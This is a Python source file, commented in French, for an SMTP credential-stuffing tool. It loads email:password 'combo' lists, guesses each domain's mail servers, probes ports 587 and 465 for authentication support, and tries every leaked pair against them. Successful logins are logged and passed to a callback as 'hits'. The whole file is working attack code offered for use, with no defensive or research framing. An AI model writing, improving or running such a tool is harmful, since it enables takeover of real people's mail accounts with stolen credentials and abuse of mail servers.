import os
import socket
import smtplib

# Timeout global plus court pour accélérer (avant: 5)
socket.setdefaulttimeout(3)


def load_combos_by_domain(path_combo):
    """
    Lit un fichier combo et regroupe les entrées par domaine.
    Format attendu : email:password
    Retourne un dict : { 'domaine.tld': [(email, password), ...], ... }
    """
    if not os.path.isfile(path_combo):
        raise FileNotFoundError(f"Combo file not found: {path_combo}")

    combos_by_domain = {}

    with open(path_combo, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue

            try:
                email, password = line.split(":", 1)
                email = email.strip()
                password = password.strip()
            except ValueError:
                continue

            if "@" not in email:
                continue

            _, domain = email.split("@", 1)
            domain = domain.strip().lower()

            if not domain:
                continue

            combos_by_domain.setdefault(domain, []).append((email, password))

    return combos_by_domain


def load_combos(path_combo):
    """
    Variante simple : retourne une liste [(email, password), ...]
    """
    if not os.path.isfile(path_combo):
        raise FileNotFoundError(f"Combo file not found: {path_combo}")

    combos = []
    with open(path_combo, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue

            try:
                email, password = line.split(":", 1)
                email = email.strip()
                password = password.strip()
            except ValueError:
                continue

            combos.append((email, password))

    return combos


def get_domains_from_combos(combos):
    """
    Extrait la liste des domaines uniques à partir d'une liste de combos [(email, pass), ...].
    """
    domains = set()
    for email, _ in combos:
        if "@" in email:
            _, domain = email.split("@", 1)
            domain = domain.strip().lower()
            if domain:
                domains.add(domain)
    return sorted(domains)


def guess_smtp_hosts(domain):
    """
    Génère quelques candidats de host SMTP à partir d'un domaine.
    Exemple : st.huflit.edu.vn -> smtp.st.huflit.edu.vn, mail.st.huflit.edu.vn,
              smtp.huflit.edu.vn, mail.huflit.edu.vn
    """
    hosts = set()

    domain = domain.strip().lower()
    if not domain:
        return []

    hosts.add(f"smtp.{domain}")
    hosts.add(f"mail.{domain}")

    parts = domain.split(".")
    if len(parts) > 2:
        parent = ".".join(parts[-2:])
        hosts.add(f"smtp.{parent}")
        hosts.add(f"mail.{parent}")

    return list(hosts)


def is_port_open(host, port):
    """
    Test simple si un port TCP est ouvert.
    """
    try:
        with socket.create_connection((host, port), timeout=3):
            return True
    except OSError:
        return False


def smtp_supports_auth(host, port, use_tls=False, use_ssl=False, log_callback=print):
    """
    Se connecte au serveur SMTP, fait EHLO et vérifie si AUTH est proposé.
    Retourne (True/False, message).
    Utilise log_callback pour logguer les erreurs si besoin.
    """
    log = log_callback

    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(host, port, timeout=5)
        else:
            server = smtplib.SMTP(host, port, timeout=5)

        code, msg = server.ehlo()
        if code != 250:
            server.quit()
            return False, f"EHLO non accepté ({code})"

        if use_tls:
            code, msg = server.starttls()
            if code != 220:
                server.quit()
                return False, f"STARTTLS échoué ({code})"
            code, msg = server.ehlo()
            if code != 250:
                server.quit()
                return False, f"EHLO après STARTTLS non accepté ({code})"

        caps = server.esmtp_features
        auth_mechs = caps.get("auth") or caps.get("AUTH")
        server.quit()

        if auth_mechs:
            return True, f"AUTH disponible ({auth_mechs})"
        else:
            return False, "Pas de AUTH dans les features"

    except Exception as e:
        log(f"[!] Erreur smtp_supports_auth sur {host}:{port} -> {e}")
        return False, f"Erreur: {e}"


def try_smtp_login(host, port, email, password, use_tls=False, use_ssl=False):
    """
    Tente une connexion SMTP + AUTH LOGIN avec email/password.
    Retourne True si login OK, False sinon.
    """
    server = None
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(host, port, timeout=8)
        else:
            server = smtplib.SMTP(host, port, timeout=8)

        code, msg = server.ehlo()
        if code != 250:
            server.quit()
            return False

        if use_tls:
            code, msg = server.starttls()
            if code != 220:
                server.quit()
                return False
            code, msg = server.ehlo()
            if code != 250:
                server.quit()
                return False

        server.login(email, password)
        server.quit()
        return True

    except Exception:
        try:
            if server is not None:
                server.quit()
        except Exception:
            pass
        return False


def bruteforce_domain(domain, combos, log_callback=print, hit_callback=None):
    """
    Pour un domaine donné :
      - génère des hosts SMTP,
      - cherche les host+port avec AUTH,
      - teste les combos (email, password) sur ces serveurs.

    log_callback(message: str) -> utilisé pour tous les logs (GUI ou console)
    hit_callback(hit: dict) -> appelé pour chaque succès SMTP
    """
    log = log_callback

    log(f"[+] Bruteforce sur domaine {domain} ({len(combos)} combos)")

    hosts = guess_smtp_hosts(domain)
    if not hosts:
        log("    Aucun host SMTP candidat généré")
        return

    targets = []

    for host in hosts:
        # On ne teste que 587 (TLS) et 465 (SSL) pour aller plus vite
        for port, mode in [(587, "tls"), (465, "ssl")]:
            log(f"    -> Scan {host}:{port} ({mode})...")
            if not is_port_open(host, port):
                log("       Port fermé / injoignable")
                continue

            use_tls = (mode == "tls")
            use_ssl = (mode == "ssl")

            ok, info = smtp_supports_auth(
                host,
                port,
                use_tls=use_tls,
                use_ssl=use_ssl,
                log_callback=log,
            )
            log(f"       {info}")
            if ok:
                log("       ==> CANDIDAT SMTP AVEC AUTH (ajout à la liste de cibles)")
                targets.append((host, port, use_tls, use_ssl))

    if not targets:
        log("    Aucun serveur SMTP avec AUTH trouvé pour ce domaine.")
        return

    log(f"    [*] Cibles SMTP avec AUTH trouvées : {len(targets)}")
    for host, port, use_tls, use_ssl in targets:
        mode = "tls" if use_tls else ("ssl" if use_ssl else "plain")
        log(f"        - {host}:{port} ({mode})")

    hit_count = 0

    for email, password in combos:
        log(f"\n    [*] Test combo : {email}:{password}")
        for host, port, use_tls, use_ssl in targets:
            mode = "tls" if use_tls else ("ssl" if use_ssl else "plain")
            log(f"        -> Tentative sur {host}:{port} ({mode})...")

            ok = try_smtp_login(
                host,
                port,
                email,
                password,
                use_tls=use_tls,
                use_ssl=use_ssl,
            )

            if ok:
                hit_count += 1
                log("        [+] SUCCÈS SMTP !!!")
                log(f"[-] Host : {host}")
                log(f"[-] Port : {port}")
                log(f"[-] Email : {email}")
                log(f"[-] Pass : {password}")
                log("++++++++++")

                if hit_callback is not None:
                    hit = {
                        "host": host,
                        "port": port,
                        "email": email,
                        "password": password,
                        "mode": mode,
                        "domain": domain,
                    }
                    hit_callback(hit)
            else:
                log("        [-] Échec")

    log(f"\n    [=] Bruteforce terminé pour {domain}, hits : {hit_count}")